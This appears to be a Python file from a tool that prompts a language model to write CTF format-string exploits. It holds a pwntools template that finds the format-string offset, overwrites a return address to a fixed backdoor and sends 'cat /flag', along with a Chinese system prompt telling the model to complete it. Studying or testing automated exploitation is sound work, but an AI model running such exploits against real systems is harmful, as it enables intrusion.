templete_py = """
# you can add more libraries if you need
from pwn import *

target = "{{TARGET}}"
port = "{{PORT}}"

p_factory = lambda: remote(target, int(port))  # noqa: E731


def exec_fmt(send):
    p = p_factory()
    # You can use your own logic to lead to the fmt vulnerability
    p.send(send)
    return p.recvall()


def exploit(offset: int):
    # Set up the connection to the target
    p = p_factory()

    # Receive the leak of payload address
    # leaked_address = p.recvline().strip()

    # Calculate the offset from the leak
    # leaked_payload_address = int(leaked_address, 16) + <OFFSET YOU CALCULATED>

    # Generates payload using pwntools's fmtstr_payload
    # Overwrite return address to point to BACKDOOR_ADDRESS (0xdead0000)
    # payload = fmtstr_payload(
    #     offset, {leaked_payload_address: 0xDEAD0000}, numbwritten=0, write_size="short"
    # )

    # Send the payload
    # p.sendline(payload)

    # Send the command to read the flag
    p.sendline(b"cat /flag")

    # Receive and print the response
    response = p.recvuntil(b"}")
    print(response.decode(errors="ignore"))

    # Close the connection
    p.close()


autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
exploit(offset)
""".strip()  # noqa:E501


def system_prompt(line: int):
    return f"""
    下面将会给你一份含有格式化字符串漏洞的代码和其汇编结果（代码行数每行注释标出），已经分析出漏洞代码很可能出现在第 {line} 行。

    你需要做的是仔细思考并编写一个 python 脚本利用这个漏洞覆盖返回地址为 backdoor（backdoor 的地址固定为
    0xdead0000）后，读取/flag 文件。
    这是你的模板攻击脚本，请填充，注意不要更改 target 和 port 模板变量。
    ```python
    {templete_py}
    ```

    请注意最后你的返回值即为攻击脚本内容，不要包含其他内容！

    值得你注意的内容：
    0. 输出直接是 python 脚本，不需要 ``` 包裹
    1. 可能你需要传入一些其他参数能够让你走到有格式化字符串漏洞的逻辑
    2. 注意该程序是 64 位程序
    """  # noqa:RUF001, E501
